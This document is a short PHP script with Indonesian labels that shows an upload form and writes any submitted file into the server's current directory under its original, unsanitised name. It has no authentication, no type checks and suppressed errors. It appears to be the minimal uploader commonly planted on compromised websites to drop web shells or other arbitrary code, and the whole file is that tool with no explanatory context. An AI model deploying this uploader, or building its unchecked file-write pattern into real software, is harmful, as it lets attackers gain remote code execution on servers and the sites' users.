<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Unggah">';

if (isset($_POST['_upl']) && $_POST['_upl'] == "Unggah") {
    $destination = getcwd() . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
    if (@copy($_FILES['file']['tmp_name'], $destination)) {
        echo '<b>File uploaded!!!</b><br>';
        echo 'Lokasi file: ' . htmlspecialchars($destination) . '<br><br>';
    } else {
        echo '<b>Failed!!!</b><br><br>';
    }
}
?>
